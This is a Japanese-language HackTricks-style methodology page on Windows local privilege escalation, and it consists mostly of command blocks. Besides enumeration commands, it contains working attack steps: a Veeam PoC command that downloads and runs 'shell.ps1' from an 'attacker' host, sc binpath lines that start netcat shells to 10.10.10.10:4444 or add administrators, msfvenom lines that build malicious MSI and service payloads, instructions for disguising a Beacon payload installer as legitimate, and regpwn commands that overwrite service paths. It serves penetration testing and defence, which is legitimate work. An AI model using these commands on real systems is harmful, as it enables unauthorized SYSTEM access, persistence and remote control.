# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors を探すための最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の基本理論

### Access Tokens

**Windows Access Tokens について知らないなら、続ける前に次のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs についての詳細は次のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels について知らないなら、続ける前に次のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、システムの列挙を**妨げる**、実行ファイルを起動する、あるいは**活動を検知する**可能性のあるさまざまなものがあります。privilege escalation の列挙を始める前に、次の**ページ**を**読んで**、これらすべての**防御****機構**を**列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` 経由で起動された UIAccess processes は、AppInfo secure-path checks を回避すると、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection bypass ワークフローはこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation は、任意の SYSTEM registry write (RegPwn) に悪用できます:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows builds では、権限のあるローカル NTLM authentication を再利用された SMB TCP connection 上で反射させる **SMB arbitrary-port** LPE path も導入されました:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows version に既知の vulnerability があるか確認してください (適用済みの patches も確認してください)。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この[site](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoft のセキュリティ脆弱性について詳細な情報を検索するのに便利です。このデータベースには 4,700 件以上のセキュリティ脆弱性があり、Windows 環境が持つ**巨大な攻撃対象領域**を示しています。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

env 変数に何か credential/Juicy 情報が保存されていますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で、これを有効化する方法を学べます
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline 実行の詳細は記録され、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、完全な実行詳細や出力結果は記録されない場合があります。

これを有効にするには、ドキュメントの "Transcript files" セクションの手順に従い、**"Powershell Transcription"** ではなく **"Module Logging"** を選択します。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs の最後の15件のイベントを表示するには、次を実行できます:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行の完全なアクティビティと全文記録が取得され、コードの各ブロックが実行されるたびに記録されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、フォレンジックや悪意ある挙動の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な洞察が得られます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは、Windows Event Viewer の次のパスで確認できます: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
直近 20 件のイベントを表示するには、次を使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Settings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http を使って要求されている場合、システムを侵害できます。

まず、cmd で以下を実行して、ネットワークが non-SSL の WSUS update を使用しているか確認します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または PowerShell では次のとおりです:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` に等しい場合。

**それは exploit 可能です。** 最後の registry が 0 に等しい場合、WSUS エントリは無視されます。

この脆弱性を exploit するために、以下のようなツールを使えます: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- これらは MiTM weaponized exploits scripts で、SSL なしの WSUS traffic に 'fake' updates を注入します。

研究はこちら:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なレポートはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。\
要するに、これがこの bug が exploit する欠陥です:

> もし local user proxy を変更する権限があり、かつ Windows Updates が Internet Explorer の settings で設定された proxy を使うなら、[PyWSUS](https://github.com/GoSecure/pywsus) を local で実行して自分自身の traffic を intercept し、資産上で elevated user として code を実行する権限があることになります。
>
> さらに、WSUS service は current user の settings を使うため、その certificate store も使います。WSUS hostname 用の self-signed certificate を生成し、この certificate を current user の certificate store に追加すれば、HTTP と HTTPS の両方の WSUS traffic を intercept できます。WSUS は certificate に対して trust-on-first-use 型の validation を実装するための HSTS のような mechanism を使っていません。提示された certificate が user によって trusted であり、かつ正しい hostname を持っていれば、service に受け入れられます。

この vulnerability はツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) を使って exploit できます（解放されたら）。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くの enterprise agent は localhost の IPC surface と privileged な update channel を公開しています。enrollment を attacker server に強制でき、かつ updater が rogue root CA または弱い signer checks を信頼するなら、local user は悪意のある MSI を配信でき、SYSTEM service がそれをインストールします。一般化された technique（Netskope stAgentSvc chain – CVE-2025-0309 ベース）はこちら:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` は **TCP/9401** 上で localhost service を公開しており、attacker-controlled messages を処理するため、**NT AUTHORITY\SYSTEM** として arbitrary commands を実行できます。

- **Recon**: listener と version を確認します。例: `netstat -ano | findstr 9401` と `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: 必要な Veeam DLLs と一緒に `VeeamHax.exe` のような PoC を同じ directory に置き、次に local socket 経由で SYSTEM payload をトリガーします:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
The service executes the command as SYSTEM.
## KrbRelayUp

Windows **domain** 環境では、特定の条件下で **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing is not enforced,** である環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる self-rights を持っていること、そしてドメイン内でユーザーが computer を作成できることが含まれます。重要なのは、これらの **requirements** は **default settings** で満たされるという点です。

**exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) を見つけてください

攻撃の流れについての詳細は [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を確認してください

## AlwaysInstallElevated

**If** この 2 つの registers が **enabled** されている場合（value は **0x1**）、任意の権限のユーザーでも `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（execute）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
meterpreter セッションがある場合、この手法はモジュール **`exploit/windows/local/always_install_elevated`** を使って自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使って、現在のディレクトリ内に権限昇格用の Windows MSI バイナリを作成します。このスクリプトは、ユーザー/グループ追加を促す事前コンパイル済みの MSI インストーラを書き出します（そのため GIU アクセスが必要になります）：
```
Write-UserAddMSI
```
ただ作成されたバイナリを実行して権限昇格します。

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法を学ぶには、このチュートリアルを読んでください。**command lines** を **just** 実行したいだけなら、**".bat"** ファイルを wrap できます。

{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成

{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit で、`C:\privesc\beacon.exe` に **新しい Windows EXE TCP payload** を **Generate** します
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに "installer" と入力します。**Setup Wizard** プロジェクトを選択して **Next** をクリックします。
- プロジェクト名を **AlwaysPrivesc** などにし、保存場所に **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して、**Create** をクリックします。
- ファイルを含める手順の 3/4 に進むまで **Next** をクリックし続けます。**Add** をクリックして、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、インストールされたアプリをより正当らしく見せるために変更できる他のプロパティもあります。
- プロジェクトを右クリックして **View > Custom Actions** を選択します。
- **Install** を右クリックして **Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、インストーラーが実行されるとすぐに beacon payload が実行されることが保証されます。
- **Custom Action Properties** で **Run64Bit** を **True** に変更します。
- 最後に、**build it** します。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という警告が表示された場合は、プラットフォームが x64 に設定されていることを確認してください。

### MSI Installation

悪意のある `.msi` ファイルの **installation** を **background:** で実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

これらの設定は、何が**ログに記録される**かを決定するので、注意してください
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログがどこに送信されるかを知っておくと興味深いです
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル Administrator パスワードの管理**のために設計されており、各パスワードがドメインに参加しているコンピュータ上で**一意、ランダム化され、定期的に更新**されることを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。認可されている場合は、ローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS** (Local Security Authority Subsystem Service) に保存されます。\
[**WDigest の詳細はこのページ**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する強化された保護を導入し、信頼されていないプロセスがそのメモリを**読み取る**ことやコードを注入することを**ブロック**して、システムをさらに保護しています。\
[**LSA Protection についての詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash attacks のような脅威からデバイス上に保存された credentials を保護することです。| [**Credentials Guard の詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた認証情報

**Domain credentials** は **Local Security Authority** (LSA) によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーの domain credentials が確立されます。\
[**Cached Credentials に関する詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザー & グループ

### ユーザー & グループの列挙

自分が所属しているグループのうち、興味深い権限を持つものがないか確認するべきです
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

もしあなたが**何らかの特権グループに所属している場合、権限昇格できる可能性があります**。特権グループについて学び、それを悪用して権限昇格する方法はこちら:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**token とは何か**については、このページで**詳しく学べます**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
以下のページで、**興味深い token について学び**、それをどう悪用するかを確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスの一覧を見たら**そのプロセスのコマンドライン内にパスワードが含まれていないか確認**してください。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダに書き込み権限があるかを確認し、可能な [**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用してください:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリのフォルダの権限を確認する（**[**DLL Hijacking**](dll-hijacking/index.html)**）**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

**procdump** を使って、実行中のプロセスのメモリダンプを作成できます。FTP のようなサービスは **資格情報がメモリ内に平文で存在** することがあるので、メモリをダンプして資格情報を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM で実行されているアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: "Windows Help and Support" (Windows + F1) で "command prompt" を検索し、"Click to open Command Prompt" をクリックする

## Services

Service Triggers により、Windows は特定の条件が発生したときに service を開始できます（named pipe/RPC endpoint activity、ETW events、IP availability、device arrival、GPO refresh など）。`SERVICE_START` 権限がなくても、trigger を発火させることで権限のある service を起動できることがよくあります。列挙および有効化の技法はこちら:

-
{{#ref}}
service-triggers.md
{{#endref}}

services の一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc** を使ってサービスの情報を取得できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」が任意の service を変更できるか確認することを推奨します:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP 用の accesschk.exe を here からダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効化する

このエラーが出る場合（たとえば SSDPSRV の場合）:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

次を使用して有効化できます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**XP SP1 では、service upnphost が動作するために SSDPSRV に依存していることに注意してください**

**この問題の別の workaround** は、次を実行することです:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

「Authenticated users」グループがあるサービスに対して **SERVICE_ALL_ACCESS** を持っている場合、そのサービスの実行ファイルバイナリを変更できます。**sc** を変更して実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスを再起動する
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
以下のような各種権限を通じて権限昇格が可能です:

- **SERVICE_CHANGE_CONFIG**: サービスのバイナリを再設定できます。
- **WRITE_DAC**: 権限の再設定を可能にし、サービス設定を変更できるようになります。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を許可します。
- **GENERIC_WRITE**: サービス設定を変更する能力を継承します。
- **GENERIC_ALL**: 同じくサービス設定を変更する能力を継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

**サービスによって実行されるバイナリを変更できるか**、またはバイナリが置かれているフォルダに**書き込み権限があるか**を確認します ([**DLL Hijacking**](dll-hijacking/index.html))**。**\
**wmic** を使うと、サービスによって実行されるすべてのバイナリを取得できます（system32 以外）し、**icacls** を使って権限を確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
**sc** と **icacls** も使用できます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

サービスのregistryを変更できるか確認してください。\
service **registry** に対する **permissions** を以下で**確認**できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。もしそうなら、サービスによって実行されるバイナリを変更できます。

実行されるバイナリの Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

一部の Windows Accessibility 機能は、ユーザーごとの **ATConfig** キーを作成し、後で **SYSTEM** プロセスによって HKLM の session key にコピーされます。Registry の **symbolic link race** を使うと、この特権書き込みを **任意の HKLM path** に向け直せるため、任意の HKLM **value write** primitive が得られます。

主要な場所（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` は、インストール済みの accessibility features を一覧表示します。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` は、ユーザーが制御できる configuration を保存します。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は、logon/secure-desktop 遷移中に作成され、ユーザーが書き込み可能です。

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM に書き込ませたい **HKCU ATConfig** value を設定します。
2. secure-desktop の copy をトリガーします（例: **LockWorkstation**）。これで AT broker flow が開始されます。
3. **race に勝つ**ため、`C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定します。oplock が発火したら、**HKLM Session ATConfig** key を保護された HKLM target への **registry link** に置き換えます。
4. SYSTEM が、攻撃者が選んだ value をリダイレクト先の HKLM path に書き込みます。

任意の HKLM value write を得たら、service configuration values を上書きして LPE に進みます:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

通常ユーザーが開始できる service（例: **`msiserver`**）を選び、書き込み後に起動します。**Note:** 公開されている exploit 実装では、race の一部として **locks the workstation** します。

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows サービスの場合、これは**任意のコードを実行するのに十分**です:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへのパスが引用符で囲まれていない場合、Windows はスペースの前にある各末尾を順に実行しようとします。

たとえば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次を実行しようとします:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みのWindowsサービスに属するものを除いて、すべてのunquoted service pathsを列挙する:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は** metasploit で検知・悪用できます: `exploit/windows/local/trusted\_service\_path` metasploit でサービスバイナリを手動作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は binary を指すように設定できます。この binary を置き換え可能であれば、privilege escalation が可能かもしれません。詳細は[official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## Applications

### Installed Applications

**binaries の権限**（1つを書き換えて privilege escalation できるかもしれません）と、**folders** の権限（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

特別なファイルを読み取るために何らかの設定ファイルを変更できるか、または Administrator アカウントによって実行されるバイナリを変更できるかを確認します (schedtasks)。

システム内の弱いフォルダ/ファイル権限を見つける方法の1つは、次のとおりです:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
